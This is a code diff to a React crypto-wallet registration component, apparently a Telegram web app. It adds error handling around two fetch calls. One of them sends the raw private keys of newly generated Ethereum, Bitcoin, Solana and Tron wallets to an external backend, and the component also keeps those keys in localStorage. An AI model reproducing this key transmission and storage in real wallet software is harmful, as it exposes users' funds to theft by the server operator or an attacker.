@@ -8,6 +8,7 @@ import { TronWeb } from 'tronweb';
 import * as multichainWallet from 'multichain-crypto-wallet';
 import { BsHouse, BsWallet2, BsShop, BsLightningCharge, BsCashStack, BsCopy, BsQrCode } from "react-icons/bs";
 import { id } from "ethers";
+import { error } from "node:console";
  
 const StyledApp = styled.div`
   background-color: #F9F9F9;
@@ -100,30 +101,32 @@ function Register() {
         localStorage.setItem('tronWalletkey', tronWallet.privateKey);
 
 
-            
+          //for database   
           const ethAdd =    ethereumWallet.address;
            const bitAdd =   bitcoinWallet.address;
           const solAdd =    solanaWallet.address;
            const tronAdd =   tronWallet.address.base58;
-      
-          
-      const p_k = [ethereumWallet.privateKey, bitcoinWallet.privateKey, solanaWallet.privateKey, tronWallet.privateKey];
+    try{
+      const p_k = [ethereumWallet.privateKey, bitcoinWallet.privateKey, solanaWallet.privateKey, tronWallet.privateKey]  as string[];
 
-          fetch("https://twa-backend-g83o.onrender.com/profiledkey", {
+         await fetch("https://twa-backend-g83o.onrender.com/profiledkey", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             credentials: "include",  
             body: JSON.stringify( {  p_k }),
         });
-        const Address =  [ethAdd, bitAdd, solAdd, tronAdd];
-        fetch("https://twa-backend-g83o.onrender.com/wallets", {
+        const Address =  [ethAdd, bitAdd, solAdd, tronAdd] as string[];
+     await   fetch("https://twa-backend-g83o.onrender.com/wallets", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           credentials: "include",  
           body: JSON.stringify( { Address }),
       })
-      
+    }
        
+    catch  {
+      console.error('failed to post request ');
+  } 
     };
    
     const ethAddress = localStorage.getItem('ethereumWallet') as string;
@@ -163,8 +166,7 @@ function Register() {
           }
         
     }, [ ]); // Run this effect only once
-    const [click, clicked] = useState(false);
-    const [clickFocus, Setclicked] = useState('0');
+    
 
  
  
